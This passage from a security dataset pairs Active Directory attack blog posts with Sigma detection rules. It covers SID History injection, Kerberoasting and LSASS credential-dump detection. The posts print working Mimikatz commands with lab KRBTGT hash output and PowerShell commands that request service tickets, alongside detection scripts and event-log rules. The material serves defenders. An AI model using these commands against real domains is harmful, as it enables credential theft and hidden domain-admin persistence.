    "markdown": "# Sneaky Active Directory Persistence #14: SID History\n\n*September 19, 2015*\n*Categories: ActiveDirectorySecurity, Microsoft Security, Security Conference Presentation/Video*\n\nThe content in this post describes a method by which an attacker could persist administrative access to Active Directory after having Domain Admin level rights for 5 minutes.\n\nI presented on this AD persistence method in Las Vegas at DEF CON 23 (2015).\n\nComplete list of Sneaky Active Directory Persistence Tricks posts\n\nSID History is an attribute that supports migration scenarios. Every user account has an associated Security IDentifier (SID) which is used to track the security principal and the access the account has when connecting to resources. SID History enables access for another account to effectively be cloned to another. This is extremely useful to ensure users retain access when moved (migrated) from one domain to another. Since the user’s SID changes when the new account is created, the old SID needs to map to the new one. When a user in Domain A is migrated to Domain B, a new user account is created in DomainB and DomainA user’s SID is added to DomainB’s user account’s SID History attribute. This ensures that DomainB user can still access resources in DomainA.\n\nThe interesting part of this is that SID History works for SIDs in the same domain as it does across domains in the same forest, which means that a regular user account in DomainA can contain DomainA SIDs and if the DomainA SIDs are for privileged accounts or groups, a regular user account can be granted Domain Admin rights without being a member of Domain Admins.\n\nNote: A regular user in a domain can contain the Enterprise Admin SID in its SID History from another domain in the Active Directory forest, thus “elevating” access for the user account to effective Domain Admin in all domains in the forest. If you have a forest trust *without* SID Filtering enabled (also called Quarantine), it’s possible to inject a SID from another forest and it will be added to the user token when authenticated and used for access evaluations.\n\nMimikatz enables SID History injection to any user account (requires Domain Admin or equivalent rights). In this scenario, the attacker creates the user account “bobafett” and adds the default administrator account for the domain, “ADSAdministrator” (RID 500), to the account’s SID History attribute.\n\n```image\nAlt: SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator\nDescription: The image displays a command-line interface from the Mimikatz tool, specifically showing the execution of a command to add a SID (Security Identifier) to a user account named 'bobafett'. The output confirms that the SID for 'ADSAdministrator' has been successfully added to 'bobafett's' SID History. It includes details like the Mimikatz version, the command executed, and the status of the operation, indicating that the command was executed with privilege level 20.\nTranscription: |\n  PS C:\\temp\\mimikatz> .\\mimikatz \"privilege::debug\" \"misc::addsid ADSAdministrator\"\n  \n  .##.  mimikatz 2.0 alpha (x64) release \"Kiwi en C\" (May 29 2015 23:55:17)\n  ##  /\\  ##  /  =  /  =  /  = ...\n```\n\nWhen the bobafett account logs on, all of the SIDs associated with the account are added to the user’s token which is used to determine access to resources. The SIDs associated with the account is the user’s SID, the group SIDs in which the user is a member (including groups that those groups are a member of), and SIDs contained in SID History.\n\nUsing the PowerShell Active Directory cmdlet “Get-ADUser”, we can see there is no group membership assigned to the bobafett account, though it does have a SID in SIDHistory (the ADSAdministrator account).\n\n```image\nAlt: SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett\nDescription: The image displays a PowerShell command output showing the details of a user account named 'BobaFett'. It includes attributes such as DistinguishedName, Enabled status, GivenName, MemberOf, Name, ObjectClass, ObjectGUID, SamAccountName, SID, SIDHistory, Surname, and UserPrincipalName. The SIDHistory attribute indicates that the account has a reference to a SID associated with an administrative account, which relates to the topic of Active Directory persistence.\nTranscription: |\n  PS C:\\temp\\mimikatz> get-aduser bobafett -properties sidhistory,memberof\n  DistinguishedName : CN=BobaFett,CN=Users,DC=lab,DC=adsecurity,DC=org\n  Enabled           : True\n  GivenName         :\n  MemberOf          : {}\n  Name              : BobaFett\n  ObjectClass       : user\n  ObjectGUID        : d4d4e6c0-828a-469f-b243-8602300e2dbe\n  SamAccountName    : BobaFett\n  SID               : S-1-5-21-1583770191-140008446-3268284411-3103\n  SIDHistory        : {S-1-5-21-1583770191-140008446-3268284411-500}\n  Surname           :\n  UserPrincipalName : BobaFett@lab.adsecurity.org\n```\n\nWhen bobafett logs on, the SIDs associated with the account are evaluated and access determined based on these SIDs. Since the bobafett account is associated with the ADSAdmnistrator account (RID 500), the bobafett account has all access the ADSAdministrator account has, including Domain Admin rights.\n\nLeveraging the bobafett user account and the rights granted to it through SID History, it is possible to use PowerShell remoting to pull the KRBTGT account password data from a Domain Controller.\n\n```image\nAlt: SneakyPersistence-AddSIDHistory-BobaFett-Exploit-PS-Krbtgt\nDescription: The image depicts a Windows PowerShell session showing the output of commands related to the Mimikatz tool, which is used for security testing and exploitation. The session includes details about the user 'bobafett,' who has logged in to a domain and is executing the Mimikatz commands to retrieve Kerberos ticket-granting ticket (KRBTGT) credentials. The output shows various credentials associated with the current session, indicating the privileges that the user has obtained through SID History manipulation, as described in the accompanying text.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) 2009 Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Users\\BobaFett> whoami\n  adsdc.lab\\bobafett\n  PS C:\\Users\\BobaFett> Enter-PSSession -ComputerName adsdc03.lab.adsecurity.org\n  [adsdc03.lab.adsecurity.org]: PS C:\\Users\\BobaFett\\Documents> c:\\temp\\nimikatz\\Minikatz \"privilege::debug\" \"sekurlsa::krbtgt\"\n  \n  .#####.\n  #  #  #  #  #\n  #  #  #  #  #\n  #  #  #  #  #\n  '#####'\n  \n  minikatz 2.0 alpha (x64) release \"Kiwi en C\" (May 29 2015 23:55:17)\n  * * * *\n  Benjamin DELPY 'gentilkiwi' ( benjamin.delpy@gmail.com )\n  (oe.eo)\n  http://blog.gentilkiwi.com/minikatz\n  with 15 modules * * * *\n  \n  minikatz(commandline) # privilege::debug\n  Privilege '20' OK\n  \n  minikatz(commandline) # sekurlsa::krbtgt\n  \n  Current krbtgt: 5 credentials\n  * rc4_hmac_old: 1a3373f6d25a0d96c1c310173bc326\n  * rc4_hmac: 1a3373f6d25a0d96c1c310173bc326\n  * rc4_mk4: 1a3373f6d25a0d96c1c310173bc326\n  * rc4_mk5: 1a3373f6d25a0d96c1c310173bc326\n  * aes128_hmac: 2433f61c0e7b8e2d432ffb32141c5f7104e69e\n  \n  minikatz(commandline) # exit\n  Bye!\n  [adsdc03.lab.adsecurity.org]: PS C:\\Users\\BobaFett\\Documents>\n```\n\n## Detection\n\nThe best way to detect SID History account escalation is to enumerate all users with data in the SID History attribute and flag the ones which include SIDs in the same domain*. If users haven’t been migrated, you can simply search for all users with data in the SIDHistory attribute. This is why it’s important to clean up SID History after a migration is complete (and the user is added to the correct groups for required resource access).\n\nThe PowerShell AD Cmdlet “Get-ADUser” is most useful for detecting “Same Domain SID History”:\n\n```\n# Detect Same Domain SID History\nImport-Module ActiveDirectory\n[string]$DomainSID = ( (Get-ADDomain).DomainSID.Value )\nGet-ADUser -Filter “SIDHistory -Like ‘*'” -Properties SIDHistory | `\nWhere { $_.SIDHistory -Like “$DomainSID-*” }\n```\n\nThis graphic shows the result of running the “Same Domain SIDHistory” Detection PowerShell Script. Note that the SID in the user’s SIDHistory ends with “500” which is the default domain Administrator account which is a member of Administrators, Domain Admins, Schema Admins, and Enterprise Admins by default.\n\n**Note**: In multi-domain forests, it is recommended to look for admin group SIDs (and member account SIDs) in every domain in the forest as well as trusted domains/forests.\n\n**Detection via Domain Controller Events**\n\nDetection of successful modification or failed attempt to modify the SIDHistory attribute is possible with the following logging:\n\nConfigure sub-category auditing under Account Management, “Audit User Account Management” (success) on Domain Controllers for the following event ids:\n\n- 4765: SID History was added to an account.\n- 4766: An attempt to add SID History to an account failed.\n\n```image\nAlt: DC-Audit-AdvancedAuditing-Config-GPO\nDescription: The image displays a table of advanced audit configuration settings related to various security policies within an Active Directory environment. It includes sections for Account Logon, Account Management, Detailed Tracking, DS Access, Logon/Logoff, Policy Change, and Privilege Use. Each section lists specific policies along with their corresponding settings, indicating whether they track 'Success' or 'Failure' events. This table is relevant for auditing and monitoring user account management and access in a domain environment as part of cybersecurity practices.\nTranscription: |\n  Advanced Audit Configuration\n  \n  Account Logon\n  Policy\n  - Audit Credential Validation\n  - Audit Kerberos Authentication Service\n  - Audit Kerberos Service Ticket Operations\n  Setting\n  - Success, Failure\n  - Success, Failure\n  - Success, Failure\n  \n  Account Management\n  Policy\n  - Audit Computer Account Management\n  - Audit Other Account Management Events\n  - Audit Security Group Management\n  - Audit User Account Management\n  Setting\n  - Success, Failure\n  - Success, Failure\n  - Success, Failure\n  - Success, Failure\n  \n  Detailed Tracking\n  Policy\n  - Audit DPAPI Activity\n  - Audit Process Creation\n  Setting\n  - Success, Failure\n  - Success, Failure\n  \n  DS Access\n  Policy\n  - Audit Directory Service Access\n  - Audit Directory Service Changes\n  Setting\n  - Success, Failure\n  - Success, Failure\n  \n  Logon/Logoff\n  Policy\n  - Audit Account Lockout\n  - Audit Logoff\n  - Audit Logon\n  - Audit Other Logon/Logoff Events\n  - Audit Special Logon\n  Setting\n  - Success\n  - Success\n  - Success, Failure\n  - Success, Failure\n  - Success, Failure\n  \n  Policy Change\n  Policy\n  - Audit Policy Change\n  - Audit Authentication Policy Change\n  Setting\n  - Success, Failure\n  - Success, Failure\n  \n  Privilege Use\n```\n\n---\n\n**Tags:** ADAttack, DEFCON, DEFCON23, SIDHistory, SneakyADPersistence, SneakyPersistence\n\n---\n\n## Comments\n\n**3 comments**\n\n1. **Sinister** on September 20, 2015 at 2:07 pm\n   Hi there.\n   Excellent material.\n   But where is “Sneaky Active Directory Persistence” trick number 13?\n\n   **Sean Metcalf** on September 20, 2015 at 3:53 pm\n   Good catch. It will be posted after DerbyCon… 😉\n\n2. **Brad** on September 21, 2015 at 1:35 pm\n   Looks like you’re using Powershell 2.0 for your detection query. It wouldn’t work for me under PS 3.0 or 4.0; Get-ADUser gave me a syntax error on your -Filter statement. The below works correctly on all versions:\n\n   ```\n   Import-Module ActiveDirectory\n   [string]$DomainSID = ( (Get-ADDomain).DomainSID.Value )\n   Get-ADUser -Filter \"SIDHistory -Like '*'\" -Properties SIDHistory | `\n   Where {$_.SIDHistory -Like \"$DomainSID-*\"}\n   ```",
    "sigma_rule": {
      "title": "Addition of SID History to Active Directory Object",
      "id": "2632954e-db1c-49cb-9936-67d1ef1d17d2",
      "status": "stable",
      "description": "An attacker can use the SID history attribute to gain additional privileges.",
      "references": [
        "https://adsecurity.org/?p=1772"
      ],
      "author": "Thomas Patzke, @atc_project (improvements)",
      "date": "2017-02-19",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1134.005"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection1": {
          "EventID": [
            4765,
            4766
          ]
        },
        "selection2": {
          "EventID": 4738
        },
        "selection3": {
          "SidHistory": [
            "-",
            "%%1793"
          ]
        },
        "filter_null": {
          "SidHistory": null
        },
        "condition": "selection1 or (selection2 and not selection3 and not filter_null)"
      },
      "falsepositives": [
        "Migration of an account into a new domain"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_add_sid_history.yml",
    "id": "776"
  },
  {
    "url": "https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment",
    "markdown": "",
    "sigma_rule": {
      "title": "Potentially Suspicious AccessMask Requested From LSASS",
      "id": "4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76",
      "status": "test",
      "description": "Detects process handle on LSASS process with certain access mask",
      "references": [
        "https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html",
        "https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment"
      ],
      "author": "Roberto Rodriguez, Teymur Kheirkhabarov, Dimitrios Slamaris, Mark Russinovich, Aleksey Potapov, oscd.community (update)",
      "date": "2019-11-01",
      "modified": "2023-12-19",
      "tags": [
        "attack.credential-access",
        "car.2019-04-004",
        "attack.t1003.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection_1": {
          "EventID": 4656,
          "ObjectName|endswith": "\\lsass.exe",
          "AccessMask|contains": [
            "0x40",
            "0x1400",
            "0x100000",
            "0x1410",
            "0x1010",
            "0x1438",
            "0x143a",
            "0x1418",
            "0x1f0fff",
            "0x1f1fff",
            "0x1f2fff",
            "0x1f3fff"
          ]
        },
        "selection_2": {
          "EventID": 4663,
          "ObjectName|endswith": "\\lsass.exe",
          "AccessList|contains": [
            "4484",
            "4416"
          ]
        },
        "filter_main_specific": {
          "ProcessName|endswith": [
            "\\csrss.exe",
            "\\GamingServices.exe",
            "\\lsm.exe",
            "\\MicrosoftEdgeUpdate.exe",
            "\\minionhost.exe",
            "\\MRT.exe",
            "\\MsMpEng.exe",
            "\\perfmon.exe",
            "\\procexp.exe",
            "\\procexp64.exe",
            "\\svchost.exe",
            "\\taskmgr.exe",
            "\\thor.exe",
            "\\thor64.exe",
            "\\vmtoolsd.exe",
            "\\VsTskMgr.exe",
            "\\wininit.exe",
            "\\wmiprvse.exe",
            "RtkAudUService64"
          ],
          "ProcessName|contains": [
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\Microsoft\\Windows Defender\\Platform\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWow64\\",
            ":\\Windows\\Temp\\asgard2-agent\\"
          ]
        },
        "filter_main_generic": {
          "ProcessName|contains": ":\\Program Files"
        },
        "filter_main_exact": {
          "ProcessName|endswith": [
            ":\\Windows\\System32\\taskhostw.exe",
            ":\\Windows\\System32\\msiexec.exe",
            ":\\Windows\\CCM\\CcmExec.exe"
          ]
        },
        "filter_main_sysmon": {
          "ProcessName|endswith": ":\\Windows\\Sysmon64.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_aurora": {
          "ProcessName|contains": ":\\Windows\\Temp\\asgard2-agent-sc\\aurora\\",
          "ProcessName|endswith": "\\aurora-agent-64.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_scenarioengine": {
          "ProcessName|endswith": "\\x64\\SCENARIOENGINE.EXE",
          "AccessList|contains": "%%4484"
        },
        "filter_main_avira1": {
          "ProcessName|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-"
          ],
          "ProcessName|endswith": "\\avira_system_speedup.tmp",
          "AccessList|contains": "%%4484"
        },
        "filter_main_avira2": {
          "ProcessName|contains": ":\\Windows\\Temp\\",
          "ProcessName|endswith": "\\avira_speedup_setup_update.tmp",
          "AccessList|contains": "%%4484"
        },
        "filter_main_snmp": {
          "ProcessName|endswith": ":\\Windows\\System32\\snmp.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_main_googleupdate": {
          "ProcessName|contains": ":\\Windows\\SystemTemp\\",
          "ProcessName|endswith": "\\GoogleUpdate.exe",
          "AccessList|contains": "%%4484"
        },
        "filter_optional_procmon": {
          "ProcessName|endswith": [
            "\\procmon64.exe",
            "\\procmon.exe"
          ],
          "AccessList|contains": "%%4484"
        },
        "condition": "1 of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate software accessing LSASS process for legitimate reason; update the whitelist with it"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_lsass_dump_generic.yml",
    "id": "783"
  },
  {
    "url": "https://adsecurity.org/?p=3458",
    "markdown": "# Detecting Kerberoasting Activity\n\n**Date**: February 05, 2017\n**Categories**: ActiveDirectorySecurity, Hacking, Microsoft Security, Technical Reference\n**Tags**: AP-REQ, Audit Kerberos Service Ticket Operations, Detect Kerberoast Activity, Detecting Kerberoast Activity, Event ID 4769, Kerberoasting Active Directory, Kerberoasting Activity, Kerberos RC4 Encryption, Kerberos Service Ticket, Kerberos TGS, Kerberos TGS Ticket, KerberosRequestorSecurityToken, NTLM Password, PowerShell Kerberoast, RC4_HMAC_MD5, TGS-REP, TGS-REQ\n\n## Introduction\n\nKerberoasting can be an effective method for extracting service account credentials from Active Directory as a regular user without sending any packets to the target system. This attack is effective since people tend to create poor passwords. The reason why this attack is successful is that most service account passwords are the same length as the domain password minimum (often 10 or 12 characters long) meaning that even brute force cracking doesn’t likely take longer than the password maximum password age (expiration). Most service accounts don’t have passwords set to expire, so it’s likely the same password will be in effect for months if not years. Furthermore, most service accounts are over-permissioned and are often members of Domain Admins providing full admin rights to Active Directory (even when the service account only needs to modify an attribute on certain object types or admin rights on specific servers).\n\nTim Medin presented on this at DerbyCon 2014 in his “Attacking Microsoft Kerberos Kicking the Guard Dog of Hades” presentation (slides & video) where he released the Kerberoast Python TGS cracker.\n\n*This is a topic we have covered in the past in the posts “Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain” & “Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting.”*\n\nAlso Will Schroeder, aka Will Harmjoy (@harmj0y), and I spoke at DerbyCon 2016 about how to Kerberoast to escalate privileges.\n\n**Note**: This attack will not be successful when targeting services hosted by the Windows system since these services are mapped to the computer account in Active Directory which has an associated 128 character password which won’t be cracked anytime soon.\n\nLet’s quickly cover how Kerberos authentication works before diving into how Kerberoasting works and how to detect Kerberoast type activity.\n\n## Kerberos Overview & Communication Process\n\n```image\nAlt: Visio-KerberosComms\nDescription: The image is a diagram illustrating the Kerberos communication process in a network environment. It depicts a user's workstation, a Domain Controller, and an Application Server, with arrows indicating the flow of messages during authentication. The diagram includes labeled steps for each stage of the Kerberos ticketing process, such as requesting and receiving the Ticket-Granting Ticket (TGT) and Ticket Granting Service (TGS), along with optional PAC validation requests. The use of color-coded arrows helps differentiate between various types of requests and responses.\nTranscription: |\n  1. AS REQ (request TGT)\n  2. AS REP (receive TGT)\n  3. TGS REQ (present TGT, request TGS)\n  4. TGS REP (receive TGS)\n  5. AP REQ (present TGS for access)\n  6. AP REP (optional, used when mutual authentication is requested)\n  \n  PAC Validation Request (Optional)\n  PAC Validation Response (Optional)\n```\n\nUser logs on with username & password.\n\n1. a. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC as an authenticator in the authentication ticket (TGT) request (AS-REQ).\n   1. b. The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).\n\n2. The TGT is encrypted, signed, & delivered to the user (AS-REP).\n   *Only the Kerberos service (KRBTGT) in the domain can open and read TGT data.*\n\n3. The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum – If the DC can open the ticket & the checksum check out, TGT = valid. The data in the TGT is effectively copied to create the TGS ticket.\n\n4. The TGS is encrypted using the target service accounts’ NTLM password hash and sent to the user (TGS-REP).\n\n5. The user connects to the server hosting the service on the appropriate port & presents the TGS (AP-REQ). The service opens the TGS ticket using its NTLM password hash.\n\n6. If mutual authentication is required by the client (think MS15-011: the Group Policy patch from February that added UNC hardening).\n\nUnless PAC validation is required (rare), the service accepts all data in the TGS ticket with no communication to the DC.\n\n## SPN Scanning for Targets\n\nAny user authenticated to Active Directory can query for user accounts with a Service Principal Name (SPN). This enables an attacker with access to a computer on the network to identify all service accounts supporting Kerberos authentication and what they are used for. Each SPN starts with a SPN type which is the first part of the SPN. If the SPN is “MSSQLSvc/adsmsDB01.adsecurity.org:1433”, then “MSSQLSvc” is the SPN type. We can check the ADSecurity.org SPN directory and see it’s for Microsoft SQL Server. The second part (after the forward slash /) is the server name the Kerberos service is running on. The server name can be the FQDN or the short name (often both). Sometimes there’s a colon (“:”) at the end which provides additional information, such as a port number or SQL instance. Anyone can perform “SPN Scanning” in order to identify Kerberos service SPNs registered in an Active Directory forest.\n\nAttackers are most interested in Service Accounts that are members of highly privileged groups like Domain Admins. A quick way to check for this is to enumerate all user accounts with the attribute “AdminCount” equal to ‘1’. I cover AdminCount in an earlier post (“Active Directory Recon Without Admin Rights”). This means an attacker may just ask AD for all user accounts with a SPN and with AdminCount=1.\n\nUsing the Active Directory PowerShell module, we can use the Get-ADUser cmdlet:\n\n```\nget-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate\n```\n\nWe can also use PowerView’s Get-NetUser cmdlet:\n\n```\nGet-NetUser -AdminCount | Select name,whencreated,pwdlastset,lastlogon\n```\n\nOnce we have this data, we can filter further to identify the Service Accounts.\n\nAnother method to finding interesting Service Accounts is to filter based on SPN type. Some SPNs tend to have interesting permissions:\n\n- AGPMServer: Often has full control rights to all GPOs.\n- MSSQL/MSSQLSvc: Admin rights to SQL server(s) which often has interesting data.\n- FIMService: Often has admin rights to multiple AD forests.\n- STS: VMWare SSO service which could provide backdoor VMWare access.\n\nKerberoasting these SPNs could lead to attacker gaining access to the associated service account credentials, which would provide easy privilege escalation if the associated password isn’t long & complex (>25 characters) or if the associated service account isn’t configured as a Managed Service Account.\n\n## Kerberoasting\n\nThis attack involves requesting a Kerberos service ticket(s) (TGS) for the Service Principal Name (SPN) of the target service account (Step #3 above). This request uses a valid domain user’s authentication ticket (TGT) to request one or several service tickets for a target service running on a server.\n\nThe Domain Controller looks up the SPN in Active Directory and encrypts the ticket using the service account associated with the SPN in order for the service to validate user access. The encryption type of the requested Kerberos service ticket is RC4_HMAC_MD5 which means the service account’s NTLM password hash is used to encrypt the service ticket.\n\nWe can request RC4 encrypted Kerberos TGS service tickets by using the following PowerShell command:\n\n```\n$SPNName = ‘MSSQLSvc/adsmsDB01.adsecurity.org:1433’\nAdd-Type -AssemblyNAme System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName\n```\n\nRunning `klist` shows the new Kerberos service ticket with RC4-HMAC encryption.\n\nThe next step is exporting the Kerberos ticket we just requested from memory, which can be done easily with Mimikatz (without admin rights).\n\nKerberoast can attempt to open the Kerberos ticket by trying different NTLM hashes and when the ticket is successfully opened, the correct service account password is discovered. The Domain Controller doesn’t track if the user ever actually connects to these resources (or even if the user has access), so a user can request hundreds of service tickets, even if they never actually connect to the service.\n\n**Note**: No elevated rights are required to get the service tickets and no traffic is sent to the target.\n\nNote that Mimikatz is not required to extract the service ticket from memory: read Will’s post “Kerberoasting without Mimikatz”.\n\n## Mitigating Kerberoast Attack Activity\n\nThe most effective mitigation of this attack is ensuring service account passwords are longer than 25 characters (and aren’t easily guessable). Managed Service Accounts and Group Managed Service Accounts are a good method to ensure that service account passwords are long, complex, and change regularly. A third party product that provides password vaulting is also a solid solution for managing service account passwords. Though any 3rd party password management tool needs to be properly evaluated since the associated service account often requires Domain Admin level rights. This evaluation should also include how these credentials are managed within the solution.\n\n## Configuring Logging to Detect Kerberoast Activity\n\nBefore having a chance to detect Kerberoasting, it’s important to have the appropriate logging enabled.\n\nKerberoasting involves requesting Kerberos TGS service tickets with RC4 encryption. Domain Controllers can log Kerberos TGS service ticket requests by configuring “**Audit Kerberos Service Ticket Operations**” under Account Logon to log successful Kerberos TGS ticket requests.\n\nEnabling this audit category on Domain Controllers will result in two interesting event ids being logged:\n- 4769: A Kerberos service ticket (TGS) was requested\n- 4770: A Kerberos service ticket was renewed\n\nEvent ID 4769 will be logged many, many times in the domain since after initial logon (and Kerberos TGT ticket request), users request Kerberos TGS service tickets to access the many services on the network (file shares, SQL, SharePoint, etc). Expect there will be around 10 to 20 Kerberos TGS requests per user every day. The 4769 event on Domain Controllers is one of the most numerous in any environment which is why it’s often not logged.\n\n## Detecting Potential Kerberoast Activity\n\nI have presented and posted on potential methods to detect Kerberoasting activity in the past:\n\n> *Detection is a lot tougher since requesting service tickets (Kerberos TGS tickets) happens all the time when users need to access resources. Looking for TGS-REQ packets with RC4 encryption is probably the best method, though false positives are likely.*\n\nMonitoring for numerous Kerberos service ticket requests in Active Directory is possible by enabling Kerberos service ticket request monitoring (“Audit Kerberos Service Ticket Operations”) and searching for users with excessive 4769 events (Event Id 4769 “A Kerberos service ticket was requested”).\n\nHere’s how to definitively detect Kerberoasting activity.\n\nWindows added Kerberos AES (128 & 256) encryption starting with Windows Server 2008 and Windows Vista which means that most Kerberos requests will be AES encrypted with any modern Windows OS. Any Kerberos RC4 tickets requested should be the exception. There are systems that only support Kerberos RC4 by default (NetApp). Inter-forest Kerberos tickets also use RC4 unless configured for AES – ensure your forest trusts support AES and then enable AES over the trust.\n\nSo, how do we determine what encryption type was used when looking at events: 0x12, 0x17…?\n\nNed Pyle (@NerdPyle) posted an article on hunting down the use of Kerberos DES encryption in the AskDS Blog on TechNet and provides this handy chart:\n\nOnce all Domain Controllers are configured to log 4769 events, these events need to be filtered before sending the data into a SIEM/Splunk. Since we are only really interested in Kerberos TGS service tickets with RC4 encryption, it’s possible to filter the events. As shown above, Kerberos events with AES encryption has Ticket Encryption Type set to 0x12.\nKerberos RC4 encrypted tickets have Ticket Encryption Type set to 0x17.\n\nThese events can be filtered using the following which greatly reduces the amount of events flowing into the SIEM/Splunk:\n\n- Ticket Options: 0x40810000\n- Ticket Encryption: 0x17\n\nWith this information, we can start investigating potential Kerberoasting activity and reduce the number of 4769 events.\n\n**Note**: Also look for Kerberos DES encryption since this is not secure. The ticket options may be different, so just filter on 4768 & 4769 events with Ticket Encryption: 0x1 OR 0x2 OR 0x3. Starting with Windows 7 & Windows Server 2008 R2, DES encryption is disabled, but it’s still important to find systems that may be attempting (& succeeding!) to get DES Kerberos tickets.\n\nWe can further reduce the number of 4769 events that flow into SIEM/Splunk:\n\n- Filter out requests from service accounts (ads45service@lab.adsecurity.org)\n- Filter on Audit Success\n- Filter out requests for service names with a “$” which are typically for computer accounts (or trusts or Managed Service Accounts, all accounts where Windows automatically generates a long, complex password).\n\nIn limited testing, I’ve seen 4769 event totals reduced from millions to thousands and hundreds using these filtering techniques.\n\nHere’s a 4769 event that may potentially be from Kerberoasting activity:\n\nSome attackers will request a bunch of RC4 TGS tickets for some or all service accounts using something similar to the following graphic.\n\nThe PowerShell script code in the graphic above is similar to PowerView functionality. The next graphic shows the results of the PowerShell script code being run.\n\nRunning `klist` shows the tickets are in user memory. Note that the initial krbtgt ticket is AES encrypted and others are RC4-HMAC(NT). That’s a bit unusual.\n\nSo, the tickets were requested… How to discover this activity?\nUsing the information regarding ticket encryption type and ticket options, we can use PowerShell to parse the DC’s event log looking for 4769 events with this info.\n\nThat looks really odd. Why would any account request several different service names (Citrix PVS, BizTalk, Business Objects, AGPM GPO management, and several SQL service accounts) within a second or two of each other?\n\nThat stands out and looks really suspicious and is very likely Kerberoasting activity. This provides great information on what users could be compromised and what activity on which computers should be scrutinized.\n\nA single user requesting RC4 encrypted TGS tickets for several services, such as lots of SQL service principal names is suspicious and it’s worth investigating the IP (client address) the requests came from. The same thing is true for multiple RC4 encrypted TGS requests over time for lots of service principal names. A pattern does emerge when there’s one or two accounts that request a variety or RC4 TGS tickets.\n\n## Update: Added Part 2 on How to Detect Kerberoasting Activity\n\n**Detecting Kerberoasting Activity Part 2 – Creating a Kerberoast Service Account Honeypot**\n\nIf you are logging PowerShell activity, you can use my offensive PowerShell indicators to detect standard use of common PowerShell attack tools.\nI cover detecting offensive PowerShell in the previous post “Detecting Offensive PowerShell Attack Tools” & “PowerShell Security: PowerShell Attack Tools, Mitigation, & Detection”. I also covered PowerShell security in my BSidesCharm & BSidesDC talks in 2016.\n\nSpecifically:\n\n- Deploy PowerShell v5 (or newer) and enable module logging & script block logging.\n- Send the following PowerShell log event ids to the central logging solution: 400 & 800\n- Pull the following PowerShell Operational log event ids to the central logging solution: 4100, 4103, 4104\n- Configuring system-wide transcription to send a log of all activity per user, per system to a write-only share, is incredibly valuable to catch suspicious/malicious activity that can be missed or not logged to the event logs. Even better is ingesting these transcript text files into something like Splunk for further analysis.\n\nNote the addition of “KerberosRequestorSecurityToken” which is the PowerShell method to request Kerberos tickets.\n\n## Conclusion\n\nKerberoasting requires requesting Kerberos TGS service tickets with RC4 encryption which shouldn’t be most of the Kerberos activity on a network. Logging 4769 events on Domain Controllers, filtering these events by ticket encryption type (0x17), known service accounts (Account Name field) & computers (Service Name field) greatly reduces the number of events forwarded to the central logging and alerting system. Gathering and monitoring this data also creates a good baseline of what’s “normal” in order to more easily detect anomalous activity.\n\n## Kerberoasting References\n\n- Detecting Kerberoasting Activity Part 2 – Creating a Kerberoast Service Account Honeypot\n- Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain\n- Attack Methods for Gaining Domain Admin Rights in Active Directory\n- Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting\n- Targeted Kerberoasting (Harmj0y)\n- Kerberoasting without Mimikatz (Harmj0y)\n- Roasting AS REPs (Harmj0y)\n- Sean Metcalf’s Presentations on Active Directory Security\n- Kerberoast (GitHub)\n- Tim Medin’s DerbyCon “Attacking Microsoft Kerberos Kicking the Guard Dog of Hades” presentation in 2014 (slides & video).",
    "sigma_rule": {
      "title": "Suspicious Kerberos RC4 Ticket Encryption",
      "id": "496a0e47-0a33-4dca-b009-9e6ca3591f39",
      "status": "test",
      "description": "Detects service ticket requests using RC4 encryption type",
      "references": [
        "https://adsecurity.org/?p=3458",
        "https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-02-06",
      "modified": "2022-06-19",
      "tags": [
        "attack.credential-access",
        "attack.t1558.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4769,
          "TicketOptions": "0x40810000",
          "TicketEncryptionType": "0x17"
        },
        "reduction": {
          "ServiceName|endswith": "$"
        },
        "condition": "selection and not reduction"
      },
      "falsepositives": [
        "Service accounts used on legacy systems (e.g. NetApp)",
        "Windows Domains with DFL 2003 and legacy systems"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_rc4_kerberos.yml",
    "id": "785"
  },
  {
    "url": "https://web.archive.org/web/20230329155141/https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html",
